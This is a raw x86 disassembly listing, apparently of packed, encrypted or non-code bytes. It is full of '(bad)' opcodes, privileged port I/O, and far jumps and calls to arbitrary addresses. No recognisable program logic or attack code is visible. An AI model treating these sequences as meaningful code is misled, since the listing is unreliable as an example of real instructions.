  426a8d:	out    dx,al
  426a8e:	pop    ecx
  426a8f:	out    dx,al
  426a90:	enter  0x8d80,0x40
  426a94:	shl    ebp,cl
  426a96:	xor    eax,0xadeddaaa
  426a9b:	lahf   
  426a9c:	and    eax,0x4ad720a4
  426aa1:	pop    ss
  426aa2:	xor    bh,ah
  426aa4:	pusha  
  426aa5:	inc    ecx
  426aa6:	jo     0x426ae9
  426aa8:	sbb    DWORD PTR [ebx+0x302706cd],edi
  426aae:	retf   
  426aaf:	pop    ss
  426ab0:	xchg   esi,eax
  426ab1:	push   es
  426ab2:	fistp  QWORD PTR [eax]
  426ab4:	dec    ecx
  426ab5:	jmp    0x426a75
  426ab7:	push   eax
  426ab8:	or     eax,0xf3a442d4
  426abd:	sbb    al,0xde
  426abf:	jp     0x426ac6
  426ac1:	cmp    eax,0x0
	...
  426b32:	add    BYTE PTR [eax],al
  426b34:	(bad)  
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	and    bh,cl
  426b42:	loope  0x426b26
  426b44:	and    BYTE PTR [ecx+eax*1+0xf600],bl
  426b4b:	add    bh,bh
  426b4d:	jl     0x426ae3
  426b4f:	jecxz  0x426b3b
  426b51:	ins    DWORD PTR es:[edi],dx
  426b52:	push   ecx
  426b53:	xchg   ecx,eax
  426b54:	xor    DWORD PTR [esp+esi*1+0x7d],ecx
  426b58:	dec    ebx
  426b59:	ficomp WORD PTR [esi]
  426b5b:	mov    ds:0xb5d99563,eax
  426b60:	mov    esi,0xcb924687
  426b65:	std    
  426b66:	lahf   
  426b67:	sbb    al,0x73
  426b69:	jnp    0x426bbf
  426b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b6c:	pop    esp
  426b6d:	mov    ?,WORD PTR [edi+eiz*8]
  426b70:	fdivr  QWORD PTR [ecx+0x75]
  426b73:	cli    
  426b74:	out    dx,eax
  426b75:	mov    WORD PTR [edx],gs
  426b77:	push   0xffffffe4
  426b79:	or     ch,ah
  426b7b:	mov    al,ds:0x159df0b4
  426b80:	xchg   esp,eax
  426b81:	add    eax,DWORD PTR [edx]
  426b83:	stos   BYTE PTR es:[edi],al
  426b84:	dec    ebx
  426b85:	cli    
  426b86:	repnz pushf 
  426b88:	sub    al,0xb6
  426b8a:	pop    DWORD PTR [ecx+ebp*2+0x59b21ffc]
  426b91:	mov    ch,BYTE PTR [eax+0x3523fe99]
  426b97:	mov    WORD PTR [esi],gs
  426b99:	mov    bh,BYTE PTR [ecx-0x570c5330]
  426b9f:	fdivr  DWORD PTR [ebp+ebp*2-0x4e820d83]
  426ba6:	bound  ecx,QWORD PTR [edx-0x64]
  426ba9:	adc    al,0xd7
  426bab:	ds scas eax,DWORD PTR es:[edi]
  426bad:	inc    edi
  426bae:	add    dh,BYTE PTR [edx]
  426bb0:	xor    al,0x3c
  426bb2:	pop    ebx
  426bb3:	sub    eax,DWORD PTR [ecx+edi*8-0x13]
  426bb7:	hlt    
  426bb8:	int    0xef
  426bba:	xchg   ecx,eax
  426bbb:	call   0x3cf33187
  426bc0:	cmp    al,0x23
  426bc2:	cmp    bl,BYTE PTR [eax+ecx*4+0x693ca998]
  426bc9:	push   edx
  426bca:	out    dx,eax
  426bcb:	in     al,0x24
  426bcd:	ret    0xa085
  426bd0:	ds cmp ah,BYTE PTR gs:[esi-0x5fbb3162]
  426bd8:	ja     0x426c13
  426bda:	adc    BYTE PTR [eax+0x4464a540],bl
  426be0:	shr    BYTE PTR [edi],1
  426be2:	dec    ecx
  426be3:	ror    BYTE PTR [edx-0x6c],cl
  426be6:	add    ch,BYTE PTR [ecx-0x54]
  426be9:	mov    ds:0xcccc54c5,eax
  426bee:	mov    esi,DWORD PTR [edi]
  426bf0:	clc    
  426bf1:	fwait
  426bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bf3:	nop
  426bf4:	push   ecx
  426bf5:	fs ret 0x5db4
  426bf9:	xchg   edx,eax
  426bfa:	outs   dx,DWORD PTR ds:[esi]
  426bfb:	outs   dx,DWORD PTR ds:[esi]
  426bfc:	adc    ecx,DWORD PTR ds:0x220b6dad
  426c02:	add    esp,DWORD PTR [edx-0x51]
  426c05:	lods   al,BYTE PTR ds:[esi]
  426c06:	lock into 
  426c08:	das    
  426c09:	aam    0x7d
  426c0b:	gs cli 
  426c0d:	sub    al,0xde
  426c0f:	out    0x7e,al
  426c11:	adc    edi,edx
  426c13:	sub    eax,ecx
  426c15:	sti    
  426c16:	arpl   WORD PTR [edx+0x24c4171],bp
  426c1c:	iret   
  426c1d:	cmp    DWORD PTR [eax],ebp
  426c1f:	cld    
  426c20:	iret   
  426c21:	cli    
  426c22:	retf   0xb514
  426c25:	cwde   
  426c26:	test   eax,0x95e26e5c
  426c2b:	xchg   edx,eax
  426c2c:	inc    ebp
  426c2d:	xchg   esi,eax
  426c2e:	adc    BYTE PTR [edx],ah
  426c30:	mov    bh,0x5f
  426c33:	ds pop esp
  426c35:	and    al,0x8e
  426c37:	jg     0x426c9c
  426c39:	in     eax,dx
  426c3a:	push   esi
  426c3b:	fwait
  426c3c:	push   edx
  426c3d:	xchg   ecx,eax
  426c3e:	into   
  426c3f:	rdpmc  
  426c41:	popa   
	...
  426cb2:	add    BYTE PTR [eax],al
  426cb4:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	push   ebx
  426cc1:	lock jae 0x426d43
  426cc4:	push   ss
  426cc5:	popf   
  426cc6:	add    DWORD PTR [eax],eax
  426cc8:	test   BYTE PTR [eax],0x0
  426ccb:	add    BYTE PTR [ebx-0x42d720a],cl
  426cd1:	or     edi,DWORD PTR [edx+ebp*4-0x507ee45b]
  426cd8:	add    BYTE PTR [edx+0x4a],dh
  426cdb:	out    dx,eax
  426cdc:	cli    
  426cdd:	xor    cl,BYTE PTR [ebp-0x5b]
  426ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ce1:	ror    BYTE PTR [esi],0x43
  426ce4:	push   ebp
  426ce5:	sahf   
  426ce6:	clc    
  426ce7:	pop    ds
  426ce8:	mov    ebp,esi
  426cea:	cli    
  426ceb:	mov    ds:0x1ab60048,eax
  426cf0:	ins    BYTE PTR es:[edi],dx
  426cf1:	and    dh,BYTE PTR [edi+0x725e4b75]
  426cf7:	and    ebp,ecx
  426cf9:	and    al,0xca
  426cfb:	sub    bh,BYTE PTR [ebp-0x48]
  426cfe:	out    0x52,eax
  426d00:	clc    
  426d01:	sub    BYTE PTR ds:0xc0acbe76,0x33
  426d08:	push   esp
  426d09:	pop    ss
  426d0a:	jbe    0x426d30
  426d0c:	cmp    eax,0x488f5264
  426d11:	add    esi,DWORD PTR [edi+0x3029e905]
  426d17:	or     ah,BYTE PTR [ebp+0x75]
  426d1a:	popa   
  426d1b:	daa    
  426d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d1d:	out    dx,eax
  426d1e:	mov    bl,cl
  426d20:	jecxz  0x426cd3
  426d22:	push   0xf0b2d536
  426d27:	out    0xf4,eax
  426d29:	fimul  WORD PTR [ebp+0x1bd73768]
  426d2f:	imul   edx,DWORD PTR [edi+0x4c],0xaf7c2582
  426d36:	dec    ecx
  426d37:	les    ecx,FWORD PTR [edi+esi*1-0x73]
  426d3b:	fsub   DWORD PTR [eax]
  426d3d:	and    cl,BYTE PTR [esi]
  426d3f:	stc    
  426d40:	sahf   
  426d41:	jl     0x426cc8
  426d43:	cmp    al,0x92
  426d45:	paddd  mm7,QWORD PTR [ebx+ecx*1+0x4e]
  426d4a:	cli    
  426d4b:	inc    ebx
  426d4c:	jecxz  0x426dab
  426d4e:	jns    0x426d73
  426d50:	loop   0x426ce2
  426d52:	sbb    bl,BYTE PTR [eax-0x3077b2b5]
  426d58:	arpl   WORD PTR [ebp-0x42],di
  426d5b:	sub    DWORD PTR [ebx-0x7b5674ec],ecx
  426d61:	inc    ecx
  426d62:	inc    edx
  426d63:	out    dx,eax
  426d64:	mov    ah,0xf2
  426d66:	jmp    0x426d13
  426d68:	shl    BYTE PTR [eax],1
  426d6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d6b:	aad    0x24
  426d6d:	xchg   edx,eax
  426d6e:	ins    DWORD PTR es:[edi],dx
  426d6f:	lods   al,BYTE PTR ds:[esi]
  426d70:	loop   0x426d5e
  426d72:	gs (bad) 
  426d74:	mov    ch,0x33
  426d76:	add    al,0xf2
  426d78:	(bad)  
  426d7a:	xor    edi,DWORD PTR ds:0xfe9cd559
  426d80:	and    al,BYTE PTR es:[ebx+0x49b0cb31]
  426d87:	add    BYTE PTR [ecx],0xf3
  426d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d8b:	pop    es
  426d8c:	pop    eax
  426d8d:	cmp    bh,BYTE PTR [ecx-0x2c]
  426d90:	in     eax,0xb1
  426d92:	dec    eax
  426d93:	outs   dx,BYTE PTR ds:[esi]
  426d94:	pop    es
  426d95:	adc    ch,BYTE PTR [ebp-0x2]
  426d98:	rsqrtps xmm6,XMMWORD PTR [edx-0x49]
  426d9c:	sbb    cl,BYTE PTR [eax]
  426d9e:	xchg   edi,eax
  426d9f:	fsubr  DWORD PTR [ebx-0x4a92956]
  426da5:	retf   0x28c8
  426da8:	scas   eax,DWORD PTR es:[edi]
  426da9:	(bad)  
  426daa:	ja     0x426e06
  426dac:	sbb    dh,BYTE PTR [eax-0x485e1d3]
  426db2:	ins    BYTE PTR es:[edi],dx
  426db3:	or     al,0x25
  426db5:	in     eax,0x9f
  426db7:	cmp    al,0x7a
  426db9:	sub    DWORD PTR [eax+edx*1-0x6ee600e4],eax
  426dc0:	fcmovb st,st(3)
	...
  426e32:	add    BYTE PTR [eax],al
  426e34:	(bad)  
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	dec    ebx
  426e41:	ins    DWORD PTR es:[edi],dx
  426e42:	mov    ds:0x19e0c5d,al
  426e47:	add    dh,dh
  426e49:	add    BYTE PTR [eax],al
  426e4b:	add    BYTE PTR [edi-0x4f],al
  426e4e:	mov    bh,0xc9
  426e50:	aas    
  426e51:	leave  
  426e52:	dec    DWORD PTR [edx-0x76e36f51]
  426e58:	adc    DWORD PTR [ebp-0x5d],esi
  426e5b:	fwait
  426e5c:	daa    
  426e5d:	popf   
  426e5e:	push   ss
  426e5f:	fmulp  st(3),st
  426e61:	into   
  426e62:	xor    ah,BYTE PTR [ebp+0xd]
  426e65:	pop    eax
  426e66:	inc    ecx
  426e67:	mov    bh,dh
  426e69:	and    al,0x2e
  426e6b:	push   cs
  426e6c:	mov    edx,0x38246d5a
  426e71:	or     DWORD PTR [ebp-0x32],eax
  426e74:	inc    ebp
  426e75:	outs   dx,BYTE PTR ds:[esi]
  426e76:	test   DWORD PTR [edi+0x10],ebx
  426e79:	outs   dx,BYTE PTR ds:[esi]
  426e7b:	loopne 0x426eac
  426e7d:	sahf   
  426e7e:	cld    
  426e7f:	push   ds
  426e80:	add    DWORD PTR [edx],0x32
  426e83:	inc    eax
  426e84:	sti    
  426e85:	xlat   BYTE PTR ds:[ebx]
  426e86:	scas   eax,DWORD PTR es:[edi]
  426e87:	mov    cl,ch
  426e89:	mov    esi,ebp
  426e8b:	retf   0x7e3
  426e8e:	mov    ?,WORD PTR [eax]
  426e90:	test   BYTE PTR ds:0x6da8a904,cl
  426e96:	rcl    DWORD PTR [esi+edi*2],cl
  426e99:	jns    0x426e95
  426e9b:	cdq    
  426e9c:	test   DWORD PTR [eax-0x29],esp
  426e9f:	pop    ss
  426ea0:	dec    edi
  426ea1:	mov    eax,ds:0xd8e387de
  426ea6:	jp     0x426e30
  426ea8:	es aaa 
  426eaa:	cmp    bh,BYTE PTR [edi]
  426eac:	inc    esp
  426ead:	or     BYTE PTR [esi+0x247405cc],dh
  426eb3:	xor    ebp,DWORD PTR [eax]
  426eb5:	lods   al,BYTE PTR ds:[esi]
  426eb6:	push   edi
  426eb7:	xor    al,0x2c
  426eb9:	aad    0x7b
  426ebb:	xchg   ecx,eax
  426ebc:	(bad)  
  426ebd:	out    dx,al
  426ebe:	sub    al,0x4e
  426ec0:	xchg   BYTE PTR [ebx-0x7b],ah
  426ec3:	mov    BYTE PTR [ecx*2+0x4f320f21],0xd1
  426ecb:	jae    0x426ee6
  426ecd:	les    ecx,FWORD PTR [ecx]
  426ecf:	cmp    esp,esi
  426ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ed2:	in     eax,dx
  426ed3:	fstp   DWORD PTR [eax+0x47]
  426ed6:	das    
  426ed7:	and    eax,0x91786894
  426edc:	xchg   esp,eax
  426edd:	lds    esp,FWORD PTR [ecx-0x6906842e]
  426ee3:	loop   0x426eda
  426ee5:	add    al,0xd2
  426ee7:	or     DWORD PTR [ecx-0x2c7e6381],ebx
  426eed:	dec    eax
  426eee:	sub    BYTE PTR [eax-0x41],0xec
  426ef2:	mov    ecx,0xa3c36f5d
  426ef7:	pop    esp
  426ef8:	lods   al,BYTE PTR ds:[esi]
  426ef9:	mov    edi,0x3a4a822
  426efe:	pop    ds
  426eff:	inc    ebp
  426f00:	sub    esp,DWORD PTR [esi]
  426f02:	inc    edx
  426f03:	jmp    0x1bd4:0xa119431e
  426f0a:	scas   al,BYTE PTR es:[edi]
  426f0b:	jl     0x426f6c
  426f0d:	push   es
  426f0e:	leave  
  426f0f:	fdivp  st(6),st
  426f11:	bound  ebx,QWORD PTR [edx-0x2aae5134]
  426f17:	stc    
  426f18:	lds    ebx,FWORD PTR ds:[edi]
  426f1b:	pusha  
  426f1c:	adc    BYTE PTR [ebx+0x3f],bl
  426f1f:	jnp    0x426ec7
  426f21:	sbb    DWORD PTR [ebp+0x25567879],esi
  426f27:	jl     0x426fa6
  426f29:	popf   
  426f2a:	cwde   
  426f2b:	aam    0x64
  426f2d:	jb     0x426f56
  426f2f:	pushf  
  426f30:	xor    BYTE PTR [edi-0x1bccb47f],0x58
  426f37:	cs repnz in eax,dx
  426f3a:	cdq    
  426f3b:	outs   dx,BYTE PTR ss:[esi]
  426f3d:	sub    eax,0x827b57e
	...
  426fb2:	add    BYTE PTR [eax],al
  426fb4:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	cwde   
  426fc1:	aas    
  426fc2:	xchg   ebx,eax
  426fc3:	or     DWORD PTR [edx],eax
  426fc5:	lahf   
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	test   BYTE PTR [eax],0x0
  426fcb:	add    cl,ch
  426fcd:	sub    cl,bl
  426fcf:	int    0x43
  426fd1:	repz js 0x426fc0
  426fd4:	and    esi,DWORD PTR [ebp-0x5b]
  426fd7:	pop    es
  426fd8:	int3   
  426fd9:	cdq    
  426fda:	fnstenv [ecx]
  426fdc:	callw  0xdff5
  426fe0:	pushf  
  426fe1:	daa    
  426fe2:	stos   BYTE PTR es:[edi],al
  426fe3:	(bad)  [esi+0x6c]
  426fe6:	cmp    BYTE PTR [edi-0x1741f8c7],ah
  426fec:	sti    
  426fed:	popf   
  426fee:	lock les edi,FWORD PTR [edx+0x44b9b02d]
  426ff5:	pusha  
  426ff6:	mov    bh,0xfb
  426ff8:	mov    ds,WORD PTR [esi+0x1ea98efd]
  426ffe:	cmp    BYTE PTR [edx-0x218d926a],bh
  427004:	pcmpgtd mm6,mm6
  427007:	dec    ecx
  427008:	scas   al,BYTE PTR es:[edi]
  427009:	ds dec edx
  42700b:	add    al,0x93
  42700d:	jne    0x427081
  42700f:	call   0xf57e:0xd886a063
  427016:	mov    ebx,0xd5a47c17
  42701b:	int    0x6e
  42701d:	pop    ecx
  42701e:	dec    edi
  42701f:	out    0xad,al
  427021:	mov    dl,0xa2
  427023:	jo     0x427090
  427025:	mov    DWORD PTR [esi-0x2b],edx
  427028:	add    ebp,0x7260264f
  42702e:	mov    bl,0xe7
  427030:	adc    DWORD PTR [eax-0x27],ebp
  427033:	or     cl,BYTE PTR [esi+0x8]
  427036:	and    al,0xe4
  427038:	xor    BYTE PTR [eax-0x49],cl
  42703b:	stos   DWORD PTR es:[edi],eax
  42703c:	retf   
  42703d:	dec    ebx
  42703e:	mov    esp,0x862eccd
  427043:	xor    bh,dh
  427045:	adc    BYTE PTR [eax],dl
  427047:	jl     0x426ff6
  427049:	xchg   DWORD PTR [eax+0x54e87b7e],ebx
  42704f:	push   cs
  427050:	shr    BYTE PTR fs:[eax-0x59],0x61
  427055:	sbb    edx,0xa8a0e7da
  42705b:	lea    eax,[ebx+0x6b]
  42705e:	sar    DWORD PTR [esi-0x230e86bd],1
  427064:	xor    cl,0x9f
  427067:	jo     0x42700a
  427069:	dec    ecx
  42706a:	push   es
  42706b:	dec    edx
  42706c:	popf   
  42706d:	fldenv [ecx-0x1f]
  427070:	pavgw  mm3,QWORD PTR [edi]
  427073:	cmp    al,BYTE PTR [ebp-0x1b3b7c80]
  427079:	sti    
  42707a:	push   0x50
  42707c:	jmp    0x9e71:0x764115f7
  427083:	jae    0x4270ca
  427085:	es push edx
  427087:	inc    ebp
  427088:	inc    ebx
  427089:	sbb    al,0xfe
  42708b:	fist   WORD PTR [ecx]
  42708d:	mov    dh,0xc7
  42708f:	aam    0xad
  427091:	add    eax,DWORD PTR ds:0xb8467690
  427097:	in     eax,0xe6
  427099:	out    dx,eax
  42709a:	not    BYTE PTR [edx-0x1438b0e]
  4270a0:	sub    bl,BYTE PTR [ebp+eiz*1-0x37]
  4270a4:	push   esp
  4270a5:	push   edi
  4270a6:	stos   BYTE PTR es:[edi],al
  4270a7:	cld    
  4270a8:	cmp    DWORD PTR [eax+0x1],edi
  4270ab:	lock xchg esi,eax
  4270ad:	jle    0x4270fe
  4270af:	int3   
  4270b0:	nop
  4270b1:	pushf  
  4270b2:	xchg   esp,eax
  4270b3:	dec    eax
  4270b4:	mov    bh,0x29
  4270b6:	mov    edi,0x3e70a025
  4270bb:	and    bh,ah
  4270bd:	sbb    al,0xaf
  4270bf:	loope  0x427045
  4270c1:	dec    ebp
	...
  427132:	add    BYTE PTR [eax],al
  427134:	fwait
  427135:	and    DWORD PTR [edi],ecx
  427137:	popa   
  427138:	mov    edi,0xcefbff6f
  42713d:	aad    0x24
  42713f:	aam    0x23
  427141:	mov    ah,0x74
  427143:	das    
  427144:	clc    
  427145:	lahf   
  427146:	add    DWORD PTR [eax],eax
  427148:	test   BYTE PTR [eax],0x0
  42714b:	add    al,cl
  42714d:	jbe    0x4271bb
  42714f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427150:	adc    al,BYTE PTR [esi+ecx*4]
  427153:	lds    ecx,FWORD PTR [bp+si+0x7c30]
  427158:	pushf  
  427159:	xor    bh,BYTE PTR cs:[esi+0x4102bf9d]
  427160:	mov    ebx,DWORD PTR [esi]
  427162:	adc    BYTE PTR [ebx-0x6c],dl
  427165:	add    ebx,DWORD PTR [edi]
  427167:	lods   al,BYTE PTR ds:[esi]
  427168:	push   esp
  427169:	aaa    
  42716a:	aad    0x2
  42716c:	mov    edi,0xe5f734f7
  427171:	adc    al,0xa2
  427173:	push   ebp
  427174:	pop    ebp
  427175:	mov    ah,0x80
  427177:	push   DWORD PTR ds:0x219603e3
  42717d:	xor    DWORD PTR [eax+ebx*8-0x13],0xffffff87
  427182:	push   ebp
  427183:	push   ss
  427184:	mov    dl,0xa3
  427186:	xor    eax,0x9cfb348c
  42718b:	outs   dx,BYTE PTR ds:[esi]
  42718c:	mov    es,WORD PTR [esi+0x2f]
  42718f:	mov    BYTE PTR [eax+0x9],cl
  427192:	dec    edi
  427193:	xchg   ebp,eax
  427194:	fsub   DWORD PTR [ebp+0x48f64a45]
  42719a:	daa    
  42719b:	jbe    0x42715c
  42719d:	sar    BYTE PTR [edi-0x57613985],0xde
  4271a4:	xor    ah,bh
  4271a6:	paddusw mm1,QWORD PTR [esi+0x76]
  4271aa:	fisubr WORD PTR [esi]
  4271ac:	lods   eax,DWORD PTR ds:[esi]
  4271ad:	repz call 0x6a08:0x1af2d8a2
  4271b5:	pop    ds
  4271b6:	add    BYTE PTR [ebp+0x13],dl
  4271b9:	fisub  DWORD PTR [edx]
  4271bb:	popa   
  4271bc:	(bad)  
  4271bd:	xor    ebx,edx
  4271bf:	cdq    
  4271c0:	push   ss
  4271c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271c2:	nop
  4271c3:	(bad)  
  4271c4:	mov    esp,0x29c7347b
  4271c9:	int    0x7d
  4271cb:	cmp    DWORD PTR [edx],ecx
  4271cd:	test   bx,cx
  4271d0:	cmp    BYTE PTR [ebp+0x20],bl
  4271d3:	std    
  4271d4:	dec    ebx
  4271d5:	and    al,0xab
  4271d7:	xor    eax,0xa9ea9246
  4271dc:	or     ah,dh
  4271de:	pushf  
  4271df:	cmp    al,0x49
  4271e1:	bound  ebp,QWORD PTR [ecx+eiz*1]
  4271e4:	push   eax
  4271e5:	(bad)
  4271e9:	xchg   ebx,eax
  4271ea:	and    eax,0x3fb9f346
  4271ef:	mov    eax,ds:0xbbe7642b
  4271f4:	mov    BYTE PTR [eax-0x1cfc3a88],0x1e
  4271fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271fc:	mov    al,ds:0x66df157c
  427201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427202:	cmp    al,0x8d
  427204:	stos   DWORD PTR es:[edi],eax
  427205:	cmp    DWORD PTR [ebx],edi
  427207:	ror    dl,1
  427209:	outs   dx,BYTE PTR ds:[esi]
  42720a:	repz clc 
  42720c:	and    dl,BYTE PTR [eax]
  42720e:	sbb    al,0xf4
  427210:	inc    ebx
  427211:	dec    esp
  427212:	xor    DWORD PTR [eax],eax
  427214:	loopne 0x427238
  427216:	jecxz  0x427222
  427218:	daa    
  427219:	xor    eax,0xb947d177
  42721e:	sbb    dh,BYTE PTR [ebp+0x5]
  427221:	dec    eax
  427222:	sbb    al,0x5e
  427224:	cld    
  427225:	mov    cl,0x28
  427227:	call   0xdd3771cf
  42722c:	dec    esi
  42722d:	data16 repnz in al,0x69
  427231:	add    BYTE PTR [edi+0x7a6b4cbd],dh
  427237:	jo     0x427245
  427239:	ins    BYTE PTR es:[edi],dx
  42723a:	les    esp,FWORD PTR [ebp+0x51ec67fe]
  427240:	inc    ebp
  427241:	push   eax
	...
  4272b2:	add    BYTE PTR [eax],al
  4272b4:	push   esp
  4272b5:	and    eax,0xeefd4e8d
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0xe026eff8
  4272c4:	out    dx,al
  4272c5:	mov    al,ds:0xf60001
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	sbb    DWORD PTR [ebp+0x35],0xeff5bd59
  4272d3:	jmp    0x10f87082
  4272d8:	repz jnp 0x42727d
  4272db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272dc:	fistp  WORD PTR [ecx]
  4272de:	jle    0x4272f0
  4272e0:	fld    DWORD PTR [ecx]
  4272e2:	cmp    esi,edx
  4272e4:	inc    edi
  4272e5:	and    eax,0xdde89479
  4272ea:	jmp    0x84810aae
  4272ef:	sub    bh,dl
  4272f1:	test   BYTE PTR [edi-0x595d59b6],dh
  4272f7:	push   0xffffffd2
  4272f9:	jecxz  0x42735b
  4272fb:	pop    edx
  4272fc:	jae    0x427324
  4272fe:	ret    
  4272ff:	sub    BYTE PTR [ebx+0x6c],ah
  427302:	sti    
  427303:	xor    DWORD PTR [ecx+0x3f936089],ebx
  427309:	lock push edi
  42730b:	jg     0x42729e
  42730d:	sar    BYTE PTR [edx+0x41],1
  427310:	lods   al,BYTE PTR ds:[esi]
  427311:	dec    esi
  427312:	in     eax,dx
  427313:	pop    ebp
  427314:	pop    ebx
  427315:	pop    ss
  427316:	xchg   esp,eax
  427317:	js     0x4272e0
  427319:	ss call 0xc55c45e7
  42731f:	pushf  
  427320:	pop    ss
  427321:	neg    ch
  427323:	test   eax,0x9b44dfc0
  427328:	sub    eax,0x344d95ba
  42732d:	mov    bh,0xdd
  42732f:	mov    edi,0xb6812c17
  427334:	test   BYTE PTR [edx+0x59e4aae2],0x6f
  42733b:	(bad)  [ebp-0x19f62dba]
  427341:	xor    ah,dh
  427343:	push   eax
  427344:	mov    BYTE PTR es:[edx-0x65],ch
  427348:	jnp    0x427341
  42734a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42734b:	push   ds
  42734c:	fidivr WORD PTR [ebx]
  42734e:	mov    ds:0x89f7d449,al
  427353:	aad    0xc2
  427355:	lods   eax,DWORD PTR ds:[esi]
  427356:	xor    esp,eax
  427358:	push   edx
  427359:	ret    
  42735a:	mov    bl,0x2d
  42735c:	repz mov esi,0xbedecb1b
  427362:	jl     0x42739b
  427364:	xor    dh,BYTE PTR ds:0x784df69c
  42736a:	icebp  
  42736b:	icebp  
  42736c:	sahf   
  42736d:	push   ds
  42736e:	mov    ds:0xf5a232c8,eax
  427373:	and    eax,0x8787ea14
  427378:	sub    eax,DWORD PTR [eax+0x4bee59d0]
  42737e:	enter  0x115d,0xfc
  427382:	push   ebp
  427383:	sbb    ebp,DWORD PTR [esi+0x45f8dbe2]
  427389:	xor    BYTE PTR [eax],bh
  42738b:	add    dh,BYTE PTR [eax+0x6c]
  42738e:	mov    dl,0xff
  427390:	fisttp QWORD PTR [edx+0x3ff5630e]
  427396:	cmp    DWORD PTR [esp+eax*2],edi
  427399:	cli    
  42739a:	ss js  0x4273a8
  42739d:	sbb    DWORD PTR [eax+ebp*1-0x711f7a7e],ebp
  4273a4:	lods   eax,DWORD PTR ds:[esi]
  4273a5:	ficom  DWORD PTR [edx+esi*8-0x49]
  4273a9:	popf   
  4273aa:	nop
  4273ab:	mov    bh,0x97
  4273ad:	retf   
  4273ae:	push   esi
  4273af:	pop    ebx
  4273b0:	add    DWORD PTR [eax+0x3b],edx
  4273b3:	mov    ch,0xb6
  4273b5:	sar    DWORD PTR [ecx],cl
  4273b7:	jns    0x427385
  4273b9:	xchg   bx,ax
  4273bb:	sbb    bh,BYTE PTR [esi+0x7a]
  4273be:	sub    BYTE PTR [ebp+0x70a6],ah
	...
  427434:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42743b:	outs   dx,DWORD PTR ds:[esi]
  42743c:	pop    DWORD PTR [ebx+eiz*8-0x16]
  427440:	out    0x8a,eax
  427442:	mov    dl,BYTE PTR [esp+eiz*8]
  427445:	mov    eax,ds:0xf60001
  42744a:	add    BYTE PTR [eax],al
  42744c:	(bad)  
  42744d:	je     0x42748d
  42744f:	jge    0x42741e
  427451:	mov    eax,0x582bf7bb
  427456:	(bad)  
  427457:	std    
  427458:	mov    edi,DWORD PTR [ebp+0x732700e4]
  42745e:	imul   DWORD PTR [eax-0x69]
  427461:	mov    al,ds:0x85ab39b3
  427466:	daa    
  427467:	sub    BYTE PTR [ebp+0x67528e77],bl
  42746d:	jbe    0x427470
  42746f:	or     bl,BYTE PTR [ecx-0x438bcab1]
  427475:	jae    0x42744e
  427477:	(bad)  
  427478:	fadd   st(5),st
  42747a:	scas   eax,DWORD PTR es:[edi]
  42747b:	bound  ebx,QWORD PTR ds:0x8b20086f
  427481:	jmp    0xf04b:0x759c9b2f
  427488:	dec    ecx
  427489:	push   ecx
  42748a:	aam    0x82
  42748c:	mov    ds:0x971da91d,eax
  427491:	cmp    eax,0x45644369
  427496:	pop    esi
  427497:	lock jmp 0x21d1:0x93ee84e6
  42749f:	inc    esp
  4274a0:	idiv   DWORD PTR [edx+0x6f]
  4274a3:	cmp    BYTE PTR [edi],ch
  4274a5:	cli    
  4274a6:	mov    ds:0xf1b41a81,eax
  4274ab:	(bad)  
  4274ac:	mov    bh,0x73
  4274ae:	mov    esp,0xd3c3e133
  4274b3:	dec    edi
  4274b4:	push   0xffffffcd
  4274b6:	inc    ebp
  4274b7:	push   ebp
  4274b8:	and    esp,DWORD PTR [ecx-0x3feab16a]
  4274be:	sub    al,0xb3
  4274c0:	out    0xe1,al
  4274c2:	into   
  4274c3:	das    
  4274c4:	xor    edi,edx
  4274c6:	dec    edx
  4274c7:	daa    
  4274c8:	pop    ebp
  4274c9:	sub    DWORD PTR [ebx+0x4467b6fe],edx
  4274cf:	std    
  4274d0:	fsubr  QWORD PTR [edx-0x3abed0d8]
  4274d6:	push   0x6d
  4274d8:	icebp  
  4274d9:	test   eax,0x4b707c80
  4274de:	xor    BYTE PTR [esi+0x47e29cd2],dh
  4274e4:	and    bl,BYTE PTR [esi+0x17]
  4274e7:	fcomp  DWORD PTR [edi]
  4274e9:	or     DWORD PTR [edi],edi
  4274eb:	les    ecx,FWORD PTR [ecx-0x38]
  4274ee:	into   
  4274ef:	jle    0x427542
  4274f1:	popa   
  4274f2:	mov    ds:0xd6db8e12,al
  4274f7:	dec    esi
  4274f8:	mov    dh,0x4c
  4274fa:	repz or al,0xf0
  4274fd:	xor    ebx,DWORD PTR [eax]
  4274ff:	xor    BYTE PTR [ebx+0x11494cbb],0xb5
  427506:	mov    ecx,0x3c87d211
  42750b:	pop    esp
  42750c:	shl    DWORD PTR [edi-0x47c5c36f],cl
  427512:	dec    ebp
  427513:	shl    DWORD PTR [ecx],cl
  427515:	je     0x42757f
  427517:	dec    esi
